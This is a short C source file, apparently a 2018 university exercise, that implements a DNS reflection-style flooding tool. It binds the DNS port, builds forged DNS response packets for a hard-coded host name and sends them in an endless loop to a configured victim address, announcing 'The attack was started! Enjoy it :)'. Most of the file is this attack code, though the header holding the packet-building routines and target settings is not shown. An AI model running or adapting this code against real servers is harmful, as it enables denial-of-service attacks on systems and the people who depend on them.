// UNIVERSIDADE DE BRASÍLIA - 2018/2
// YAN VICTOR DOS SANTOS
// SERVIDOR DE TESTE

#include "reflector.h"

int main()
{
	startAttack();
	return 0;
}

void startAttack()
{
	sck = socket(AF_INET, SOCK_DGRAM, 0);	
	checkSocket();
	bindPort();

	toAttack();
}

void checkSocket()
{
	if(sck == -1)
	{
		printf("There was a problem creating the socket\n");
		exit(1);
	}
	else
		printf("Socket was successfully created!\n");
}

void bindPort()
{
	attacker.sin_family = AF_INET; 
	attacker.sin_port = htons(_DNS_PORT);
	memset(attacker.sin_zero, 0x0, 8);	
	
	if (bind(sck, (struct sockaddr *) &attacker, sizeof(attacker)) == -1 )
	{	
		printf("There was a problem opening the port...\n");
		exit(1);
	}
	else
		printf("Port %d was successfully opened to simulate a DNS server!!!\n", _DNS_PORT);
}

void toAttack()
{
	char buffer[_LEN];

	// ---- victim server
	victim.sin_family = AF_INET; 
	victim.sin_port = htons(_VICTIM_PORT);
	victim.sin_addr.s_addr = inet_addr(_VICTIM_ADDRESS);
	memset(victim.sin_zero, 0x0, 8);	

	int sizeAddr = sizeof(victim);

	unsigned char host[_LEN];
	//printf("\n=> TYPE ANY HOST TO START ATTACK: ");
	//scanf("%s", host);
	strcpy(host, "www.google.com");
	printf("The attack was started! Enjoy it :)\n");
	mountDnsPackage((unsigned char) _RESPONSE, buffer, host);
	while (true)
	{
		if (sendto(sck, (char*) buffer, sizeof(struct DNS_H) + (strlen(host)+1) + sizeof(struct QUESTION), 0, (struct sockaddr*)&victim, sizeAddr) < 0)
	        printf("\nSendto local host failed!\n");
	}
}

